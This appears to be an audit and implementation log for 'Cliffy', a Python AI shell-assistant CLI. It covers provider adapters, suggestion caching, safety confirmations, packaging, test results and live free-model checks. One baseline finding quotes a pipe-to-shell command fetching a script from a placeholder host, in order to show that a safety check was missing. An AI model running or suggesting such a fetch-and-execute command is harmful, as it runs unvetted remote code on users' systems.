# Cliffy audit and implementation plan

## Goal and acceptance criteria
Ship an installable Python CLI with the existing shell/AI modes, documented multi-provider configuration, reliable inline suggestions, and repeatable isolated tests. Build wheel + source archive for public distribution; do not publish to an account without an explicit release decision. Live testing must use only confirmed zero-price APInex models. Never put real keys, private config, command payloads, or responses in release artifacts.

## Baseline findings (2026-10-05)
- No package metadata, dependency declarations, automated tracked tests, or release workflow. `tests/` and `docs/` are ignored.
- Only Groq-compatible calls are implemented; connection checks and generation duplicate request handling. All generation is capped at 150 tokens, which truncates code.
- Suggestion handler is a leading-edge throttle, not trailing-edge debounce: the final edit can be dropped. One thread per accepted edit permits overlapping stale results.
- Invalidation alone does not recompute prompt_toolkit's stored buffer suggestion after a response. Submitted input clears a local rather than the global suggestion.
- Cache lacks expiry and cwd/provider context; empty responses can hide recovery. Requests do not honor 429 cooldowns.
- Reproduced: `clean_single_line('')` raises IndexError; fenced shell text returns `bash`, not the command.
- Reproduced: `curl https://example.invalid/install.sh | bash` is allowed without confirmation; generated `../../outside.py` is accepted.
- Shell builtins use naive splitting; quoted paths and compound `pwd`/`cd` commands have incorrect semantics. EOF does not exit cleanly; history is not connected.
- Coding can overwrite files silently, fails on nested directories, and accepts model-controlled paths outside the requested project.
- Sourced wrapper uses `$0`, an unsafe predictable temp path, and does not reliably propagate errors.
- Existing README has substantial user modifications: retain its interview guide separately when adding public setup instructions. Legacy docs contain stale claims; new verification must rely on actual runs.

## Work order
1. Add failing regression tests and preserve existing unrelated files.
2. Implement provider configuration/transport: Groq compatibility, OpenAI, Anthropic Messages, Gemini generateContent, and custom OpenAI-compatible endpoints; bounded timeouts, redacted errors, shared rate limiting and 429 cooldown.
3. Implement bounded trailing debounce/single worker, stale-result suppression, contextual TTL/LRU cache, and actual UI-thread suggestion refresh.
4. Fix CLI routing, history, EOF, builtins, fenced parsing, safety confirmations, generated file confinement/overwrite protection, and wrapper behavior.
5. Add package metadata, console entrypoint, CI tests/build, safe source manifests, configuration example, and complete install/provider/release README.
6. Test all existing feature flows using mocked transports and a disposable working directory/home. Separately verify APInex docs, pricing, connectivity, command generation, fresh/cache latency, and API errors.
7. Build and install the wheel in a clean venv outside this repository; inspect archives for accidental private files. Record exact commands, measured results, and remaining gaps below.

## Release decisions still needed
- Public registry/package-name availability and owner account must be confirmed before upload. MIT was selected for the repository; local build does not mean registry publication.
- Live official Anthropic/OpenAI/Gemini checks require those providers' credentials; use mocked contract tests rather than bill an unapproved model.

## Implemented fixes
- [x] Added installable `cliffy-ai` wheel/sdist and lazy `cliffy` console entrypoint with help, version, provider/model/base-url/timeout, connectivity check, offline and skip-startup options.
- [x] Added Groq, OpenAI Chat Completions, Anthropic Messages, Gemini generateContent, APInex, and custom OpenAI-compatible adapters. Generic/native environment variables and project-local dotenv loading are supported.
- [x] Removed duplicated API transport; bounded request spacing and timeout budget, safe error messages, malformed/empty/truncated response checks, no redirects/retries, and fail-fast 429 cooldown are tested.
- [x] Replaced per-keystroke threads/throttle with one trailing-debounce worker; final edits are fetched, stale results suppressed, prompt UI explicitly refreshed, and end-of-line Tab/Right accept ghost text.
- [x] Added contextual 100-entry TTL/LRU cache (cwd/provider/model), configurable debounce/TTL/timeouts, and exclusion of secret-looking input from auto-suggestions.
- [x] Fixed EOF, inline/bare percent modes, explicit approval of AI commands, prompt escaping, status/retest, real history, and private 0600 history/logs. Logs contain metadata rather than prompts or key fragments.
- [x] Fixed quoted paths, simple persistent cd/export/unset, cd-back, subprocess exit status, and Bash compound syntax handling. Failed AND-chain steps no longer run the following step.
- [x] Fixed fenced/empty command parsing and code generation token limits; nested output folders, unique filenames, project confinement, symlink refusal, race-resistant new-file creation and overwrite approval are tested.
- [x] Added deterministic confirmation for deletion/pipe-to-shell/special-device writes and all existing destructive patterns; inconclusive AI safety advice no longer silently approves risky operations. No shell subprocess is used to analyze targets.
- [x] Fixed source launchers to forward CLI options, use BASH_SOURCE and private temporary cwd files, and propagate failure without changing parent cwd.
- [x] Preserved the previous README verbatim in `docs/INTERVIEW_GUIDE.md`; added public setup/provider/tuning/release docs and a sanitized `.env.example`. Historical/private docs are excluded from distributions.
- [x] Added CI for Python 3.10–3.13, test isolation, local HTTP round trips, package validation, and an 80% coverage gate. CI matrix is configured, not claimed as remotely run.

## Verification results (local Python 3.12.3 / Linux)

### Automated checks
```bash
env/bin/python -m pytest --basetemp=/tmp/opencode/cliffy-verification/final-tests \
  --cov=ai_shell_integration --cov=cliffy_cli --cov=cliffy_providers \
  --cov=cliffy_suggestions --cov=pattern_reference --cov=security_config \
  --cov-report=term-missing --cov-fail-under=80 -q
env/bin/python -m py_compile ai_shell_integration.py cliffy_cli.py cliffy_providers.py cliffy_suggestions.py security_config.py pattern_reference.py
bash -n cliffy cliffy.sh
env/bin/python -m pip check
git diff --check
env/bin/python -m build
env/bin/python -m twine check dist/*
```

- **196 tests + 33 subtests pass after live-test fixes. Total line coverage 86.10%; interactive runtime 84%, providers 92%, suggestions 93%, CLI 86%.** Remaining uncovered paths are chiefly exceptions/cancellations and the pattern reference's subprocess-only entrypoint.
- Compile, Bash syntax, dependency consistency, diff whitespace, wheel/sdist build and Twine metadata checks passed. There is no separately configured static typechecker/linter; Python compilation is not a claim of either. ShellCheck was unavailable.
- Test directories and homes are disposable; external inference is blocked in the suite. API tests cover native provider request contracts, authentication, errors, rate-limit spacing/cooldown, and real localhost HTTP dispatch.
- Real prompt-toolkit pipe-input tests cover asynchronous ghost-text refresh and Tab/Right acceptance; these are terminal tests, not browser mocks.
- A clean venv at `/tmp/opencode/cliffy-verification/installed` installed the wheel. The initial 184-test suite passed against installed modules outside the checkout; the latest 196-test suite is rerun against the refreshed wheel after the live-test fixes. Independent CLI subprocess smoke checks covered version, ordinary commands, cd/export persistence, history permissions, status/exit, missing-key failure and localhost `--check-api` success.
- Built artifacts: `dist/cliffy_ai-0.1.0-py3-none-any.whl` and `dist/cliffy_ai-0.1.0.tar.gz`. Archive scans exclude real `.env`, local credentials, private notes, virtualenvs, `.opencode`, `.omnirush`, and unrelated user files. `.env.example` contains placeholders only.

### Suggestion latency benchmark
One simulated 40ms fetch with the default 200ms debounce measured **240.391ms fresh**, **0.017ms exact-cache lookup**, and **0.028ms prefix-cache publication**, with **one fetch total**. These are synthetic local timings, **not measured APInex inference latency**. Provider/network queueing remains outside Cliffy's control.

### APInex research and live verification
- Public docs confirm `https://api.apinex.bond/v1/chat/completions` and Bearer authentication: https://apinex.bond/developers/models
- A direct public catalog request returned HTTP 200. `free/deepseek-v4.1-flash` is present with provider `Free`, `allowFree=true`, health `live`. The current pricing UI renders that combination as **free**, consistent with the supplied screenshot; other `free/` entries can be subscription-only.
- Catalog/docs also contain dollar rates for those IDs, so a `free/` ID is not proof of zero billing for every account. No paid model, paid fallback or subscription action was used.
- Docs specify **5 RPM per IP** and standard FIFO queue for the free tier: https://apinex.bond/developers/errors. APInex configuration now defaults to **12.1s between dispatches**, shared across all features, and handles Retry-After without automatic retries.
- Authenticated live tests used authorized credentials held in process memory, never saved in repository files or build artifacts. Existing local provider configuration was left unchanged.
- Authenticated `/v1/models` returned HTTP 200. A DeepSeek Flash connectivity request succeeded in **1.833s**, but repeated short-completion tests intermittently returned HTTP 200 with `finish_reason=length` and no usable content, even with 1024 tokens. A documented DeepSeek thinking-disable parameter was also probed through APInex; it did not resolve that gateway behavior and was not added to production.
- **All seven primary live flows passed using `free/glm-5.3-flash`**, whose current catalog entry is `Free`, `allowFree=true`, health `live`. Only free-priced model routes were tested; no paid fallback was attempted. GLM Flash is now the APInex default; explicit model overrides and existing Groq configuration are preserved.

| Live check | Result | Observed elapsed time |
| --- | --- | --- |
| Real `cliffy --check-api` runtime path | Pass | 2.049s |
| Fresh suggestion and prefix cache | Pass | 12.082s fresh including rate-spacing wait; 0.019ms cached publication |
| Real prompt-toolkit ghost text, Tab and Right acceptance | Pass | 13.945s including fresh request; terminal cache visible within 20.162ms polling resolution |
| `%` single-command mode | Pass; synthetic marker file created | 10.036s including spacing wait |
| `%%` guided task | Pass; directory and empty marker file created | 29.558s across generation/explanation calls |
| Interactive `%%%` coding flow | Pass; generated Python parsed and executed | 38.068s across the multi-request flow |
| Auto-code flow | Pass; new Python file saved without overwriting prior code, parsed and executed | 35.008s across filename/code calls |

- Sandbox: `/tmp/opencode/cliffy-live-verification/sandbox-1791219225`. Fixtures contain only synthetic markers. Generated Python was executed only after AST validation restricted it to a single harmless `print` of constant values; arbitrary model code was not executed. Terminal suggestion acceptance was observed without executing the suggested Git command.
- Combined GLM runs recorded **18 HTTP 200 responses**, including pre-fix attempts and **5 truncated auxiliary/pre-fix replies**. Primary flows ultimately passed; this is not a claim that every provider reply was valid. Median successful network time was **1.927s**. Dispatches in each shared-client run were spaced at least **12.1s** apart. Long fresh/whole-task elapsed times largely reflect the free-tier 5 RPM limit, not just network latency.
- Safe fallbacks handled missing filename/file-plan/explanation replies. Truncated code was rejected. No automatic inference retries or paid-model switching were introduced.

### Additional fixes discovered by real APInex testing
- The previous 10s timeout was shorter than the 12.1s request interval, causing follow-up requests to fail before dispatch. APInex now defaults to 30s, and suggestions inherit that budget unless explicitly overridden.
- The 10/32-token connectivity probe could report failure on an authenticated HTTP 200 reply. APInex probes/suggestions now have bounded thinking headroom; short free DeepSeek/GLM requests receive a 1024-token cap with documented low reasoning effort.
- Responses with prose surrounding a fenced command broke `%%` parsing. Fenced command/code extraction now handles that shape, with regression tests.
- Code generation previously inherited a shell-assistant system instruction. Interactive and auto-code generation now use an explicit programming-assistant/code-only system prompt; live code generation passed after this change.
- DeepSeek Flash remains available explicitly, but its observed truncation made free GLM Flash the better tested default. Upstream quota, queueing and occasional malformed/truncated output remain real limitations.
- Rotate the chat-shared key before public release. Native OpenAI/Anthropic/Gemini endpoints still have mocked contract coverage rather than live credential verification.

## Remaining release gates
- [x] Verify authenticated APInex free-model inference, actual suggestion/cache latency and primary command/code flows using the supplied key without persisting it.
- [ ] Validate official provider endpoints with their own credentials if needed; their contract mocks do not establish live availability.
- [x] Use the MIT License for the public source repository.
- [ ] Confirm registry/package-name availability and owner account.
- [ ] Upload to TestPyPI/PyPI only after those decisions and explicit release review. No registry upload has been performed.
- [ ] Native Windows and Zsh integration are not supported/verified; commands remain unsandboxed and safety checks are heuristics, not a security boundary.

## Native Bash integration (2026-10-06)
- Recommended opt-in launch: `cliffy --shell bash` creates an independent interactive Bash 4+ session, reading the user's Bash rc file without modifying it.
- Ctrl+G translates the current request into an editable command. Bash owns execution and state; Cliffy never evaluates or executes returned AI text automatically.
- `--draft TASK` prints a single bounded command; `--shell-init bash` prints trusted integration code for deliberate activation in an existing session.
- Drafts use exported provider configuration, not project dotenv loading. The provider sees only the explicit task and cwd. Inference can incur costs; there is no automatic retry or paid-model fallback.
- Separate helper processes do not share rate-spacing state. Native ghost text and Zsh are deferred; the existing assistant retains its existing feature set and state limitations.
- Integration review fixed output framing and eliminated API-key serialization into process arguments. Real PTY tests exposed ignored-SIGINT inheritance; spawn order now permits foreground Ctrl+C.
- PTY checks cover compound cwd/export persistence, sourcing/activation, functions, aliases, umask, background jobs, suspend/resume/foreground interrupt, and actual Ctrl+G insertion through a localhost provider without execution until Enter.
- Final source checks: **231 tests + 33 subtests passed**, **86.33% aggregate runtime coverage**; native backend 89%. Bash syntax, Python compilation, dependency consistency, diff whitespace, build and Twine metadata validation passed.
- Clean installed-wheel check outside the checkout: **33 selected tests + 33 subtests passed** (native backend, providers, suggestions), version and bundled shell-init syntax passed. Both distribution archives contain the Bash resource and MIT license and passed a private-file/key-pattern exclusion scan.
- No new live provider credential requests were made for native-shell verification; its API-backed terminal flow used localhost fixtures. Native Windows/macOS runtime and remote CI results are not claimed.

## Product landing-page branch
- Native CLI commit `90db801` was pushed to `origin/master`, with matching remote/local commit IDs confirmed after fetch.
- `feat/cliffy-landing-page` keeps the vanilla static site separate from the CLI branch. `site/index.html` showcases both modes; `site/docs.html` documents download/install and bring-your-own-provider/key/model setup.
- Download links serve scanned local wheel/source artifacts and checksums rather than an unpublished registry package. The site has no API-key form, analytics, external inference, frameworks, or CDN dependencies.
- Browser checks exposed mobile grid overflow, lost command newlines, and hidden no-JS navigation; all were corrected. Final verification: 238 Python tests + 33 subtests, 13 browser checks, all requested viewport captures, and local Lighthouse scores of 100 across both pages' audited categories.
- `site/README.md` records preview/testing/hosting instructions; `site/VERIFICATION.md` records measurements and remaining limits. Public hosting and remote CI results are not claimed.
